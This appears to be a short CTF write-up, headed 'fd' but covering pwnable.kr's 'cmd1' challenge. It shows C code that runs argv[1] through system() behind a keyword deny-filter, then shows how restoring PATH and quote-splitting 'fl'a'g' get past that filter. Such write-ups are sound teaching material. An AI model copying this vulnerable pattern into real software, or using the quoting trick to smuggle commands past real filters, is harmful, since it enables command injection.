## pwn : fd [writeup]

Challenge from [pwnable.kr](https://pwnable.kr/)

**In this challenge** We have this code :

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/thankyouverymuch");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}
```

We need this code to run the command `cat flag`:
```c
system( argv[1] );
```

So we have to put in our argv
```bash
cat flag
```

**This way ?**
```bash
./cmd1 "cat flag"
```

**Wrong!**

Because this line 
```c
putenv("PATH=/thankyouverymuch");
```
will set an env variable `PATH` to `/thankyouverymuch`
`PATH` is an environment variable that tells the shell which directory to search for executable files.

understand more about environment variables [HERE](https://medium.com/towards-data-engineering/understanding-the-path-variable-in-linux-2e4bcbe47bf5#:~:text=The%20PATH%20variable%20in%20Linux%20is%20an%20environment%20variable%20that,printenv%20%7C%20grep%20PATH) 

after we understand the problem let's Solve it.

**Steps To Solve**

1. Get the PATH env value by using `env` command :
![cmd1](https://i.imgur.com/lASMcQt.png)

2. Now Before executing `cat flag` we want to set our `PATH` variable to it's value, in our case :
```bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```
3. Lets give the program our export variable :
```bash
./cmd1 "export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin' && cat flag"
```
4. But why we didn't get the flag yet ?
- because of this function `filter`
```c
if(filter(argv[1])) return 0;
```

```c
int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
```

The function `filter` checks if a given command string (cmd) contains any of the substrings `"flag"`, "`sh"`, or `"tmp"`. If any of these substrings are found, the variable r is incremented by one for each match.

So it our case it returns 1 because our `argv[1]` contains `flag`.

to solve this i did a simple trick :
```bash
./cmd1 "export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin' && cat fl'a'g"
```

I addeed `''` to flag `fl'a'g` because it will expand later on to `flag`.

end.